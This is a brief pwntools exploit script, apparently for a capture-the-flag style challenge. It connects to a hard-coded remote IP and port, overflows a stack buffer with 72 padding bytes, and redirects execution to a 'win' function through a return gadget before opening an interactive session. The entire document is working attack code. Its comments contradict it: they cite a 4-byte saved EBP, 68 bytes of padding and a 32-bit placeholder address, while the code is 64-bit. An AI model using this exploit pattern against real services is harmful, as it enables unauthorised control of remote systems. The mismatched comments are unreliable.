from pwn import *

# Set up the process and context for the binary
# Target details
host = '194.31.53.241'
port = 13378

# Connect to the remote service
p = remote(host, port)

# Find the address of the win function
win_addr = p64(0x040117a)  # Replace 0x08048456 with the actual address of the win function in your binary
red_dump = p64(0x040101a)

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 72 
payload += red_dump + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
